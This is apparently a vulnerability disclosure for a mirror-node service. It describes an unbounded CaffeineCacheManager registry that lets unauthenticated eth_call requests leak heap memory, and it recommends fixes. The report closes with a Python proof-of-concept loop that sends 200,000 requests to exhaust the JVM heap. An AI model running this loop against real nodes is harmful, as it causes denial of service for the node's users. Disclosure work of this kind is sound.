### Title
Unbounded `CaffeineCacheManager` Registry Growth via Unauthenticated `eth_call` Requests Causes Memory Leak and GC Pressure

### Summary
The `cacheManagerSlotsPerContract` bean is a `CaffeineCacheManager` instantiated **without** calling `setCacheNames()`, placing it in dynamic mode. Every unique `contractId` passed to `findStorageBatch()` causes `cacheManagerSlotsPerContract.getCache(contractId.toString())` to create a new `CaffeineCache` object and permanently store it in the manager's internal `ConcurrentHashMap`. This map is never evicted. An unprivileged attacker can call the public `eth_call` endpoint with arbitrarily many distinct contract addresses, causing unbounded accumulation of cache objects in the JVM heap, leading to sustained GC pressure and potential OOM.

### Finding Description

**Exact code path:**

`EvmConfiguration.java` lines 107–112 — the `slotsPerContract` cache manager is created **without** `setCacheNames()`:
```java
@Bean(CACHE_MANAGER_SLOTS_PER_CONTRACT)
CaffeineCacheManager cacheManagerSlotsPerContract() {
    final CaffeineCacheManager caffeineCacheManager = new CaffeineCacheManager();
    caffeineCacheManager.setCacheSpecification(cacheProperties.getSlotsPerContract());
    return caffeineCacheManager;   // no setCacheNames() → dynamic mode
}
```
Compare with every other cache manager in the same file (e.g. lines 75–81, 83–89, 99–105), all of which call `setCacheNames(Set.of(...))` to pre-register a fixed set of names.

`ContractStateServiceImpl.java` lines 85–87 — on every cache miss, a new named cache is fetched (and created if absent) from the dynamic manager:
```java
private Optional<byte[]> findStorageBatch(final EntityId contractId, final byte[] key) {
    final var contractSlotsCache = ((CaffeineCache) this.contractSlotsCache.get(
            contractId, () -> cacheManagerSlotsPerContract.getCache(contractId.toString())));
```

**Root cause:** Spring's `CaffeineCacheManager` stores named caches in a `ConcurrentHashMap<String, Cache> cacheMap`. When `getCache(name)` is called with a name not already in the map, a new `CaffeineCache` (backed by a full Caffeine cache structure) is created and inserted. **There is no eviction path for this map.** The outer `contractSlotsCache` (max 3000 entries) evicts old contract entries, but when an entry is evicted, the corresponding `CaffeineCache` object remains permanently in `cacheManagerSlotsPerContract`'s internal map, referenced by the contract ID string. Each subsequent call for a new contract ID adds another permanent entry.

**Failed assumption:** The designers assumed the outer `contractSlotsCache` (bounded at 3000) would cap total memory. It caps *active* entries, but the `cacheManagerSlotsPerContract` registry is a separate, unbounded data structure that accumulates one entry per unique contract ID ever seen.

**Exploit flow:**
1. Attacker sends `eth_call` (POST `/api/v1/contracts/call`) with `to` set to contract address `C_1`.
2. EVM executes SLOAD → `ContractStorageReadableKVState.readFromDataSource()` → `contractStateService.findStorage(C_1, key)`.
3. `contractStateCache` miss → `findStorageBatch(C_1, key)` → `cacheManagerSlotsPerContract.getCache("C_1")` creates and permanently stores `Cache_C1`.
4. Attacker repeats with `C_2`, `C_3`, … `C_N` (N >> 3000).
5. After 3001 requests, `contractSlotsCache` starts evicting old entries, but `cacheManagerSlotsPerContract` retains all N `CaffeineCache` objects.
6. Each Caffeine cache object carries ~1–5 KB of internal overhead (segment arrays, atomic references, timer wheel, etc.) even when empty. At N = 100,000 unique contracts: 100–500 MB of leaked objects, all long-lived (tenured generation), causing frequent full GC cycles.

### Impact Explanation
- **Memory leak:** `cacheManagerSlotsPerContract`'s internal map grows without bound. Each entry is a full Caffeine cache object; even empty ones carry significant overhead.
- **GC pressure:** The leaked objects are long-lived (never collected), promoting to the old generation and triggering expensive full GCs. This directly degrades throughput and latency for all users of the node.
- **Potential OOM:** With sustained attack traffic at the permitted 500 RPS, the attacker can introduce hundreds of thousands of unique contract IDs within minutes, potentially exhausting heap.
- **No data exfiltration required:** The attacker does not need to read real contract data; non-existent contract addresses produce empty DB results but still trigger the cache creation path.

### Likelihood Explanation
- **No authentication required:** `eth_call` is a public, unauthenticated JSON-RPC endpoint.
- **Rate limit is permissive:** Default `requestsPerSecond=500` allows 500 unique contract IDs per second = 1.8 million per hour.
- **Trivially scriptable:** A simple loop generating sequential or random EVM addresses and sending `eth_call` requests is sufficient.
- **Persistent effect:** Cache objects accumulate across the lifetime of the JVM process; the attacker does not need to maintain a connection.
- **No on-chain cost:** Unlike Hedera network transactions, `eth_call` is a simulation endpoint with no fee.

### Recommendation
1. **Pre-register cache names** in `cacheManagerSlotsPerContract` by calling `setCacheNames()` with a fixed set, or replace the `CaffeineCacheManager` with a single bounded Caffeine cache keyed by `(contractId, slotKey)` pairs.
2. **Alternatively**, use a `LoadingCache<EntityId, Cache<ByteBuffer, byte[]>>` with a `maximumSize` on the outer map so that eviction from the outer cache also releases the inner cache object from memory entirely (not just from `contractSlotsCache`).
3. **Short-term mitigation:** Add a size cap on `cacheManagerSlotsPerContract`'s internal map by overriding `getCache()` to reject names beyond a configured limit, or enforce a maximum number of distinct contract IDs via a separate bounded map.
4. **Rate limiting:** Reduce `requestsPerSecond` and add per-IP throttling to slow the attack, though this does not fix the root cause.

### Proof of Concept
```python
import requests, json, time

RPC_URL = "http://<mirror-node-host>/api/v1/contracts/call"
HEADERS = {"Content-Type": "application/json"}

# Generate N unique contract addresses (can be non-existent)
def make_address(i):
    return "0x" + hex(i)[2:].zfill(40)

for i in range(1, 200_001):   # 200k unique contracts
    payload = {
        "jsonrpc": "2.0", "method": "eth_call",
        "params": [{"to": make_address(i), "data": "0x"}, "latest"],
        "id": i
    }
    requests.post(RPC_URL, headers=HEADERS, json=payload)
    # Each request causes cacheManagerSlotsPerContract.getCache(str(contractId))
    # to permanently insert a new CaffeineCache into its internal ConcurrentHashMap.
    # Monitor JVM heap: old-gen usage grows monotonically; full GC frequency increases.
```

After ~10,000 requests, monitor with `jcmd <pid> VM.native_memory` or a heap profiler: the `CaffeineCacheManager.cacheMap` field of the `slotsPerContract` bean will contain N entries, each holding a live `CaffeineCache` object, with no eviction ever occurring.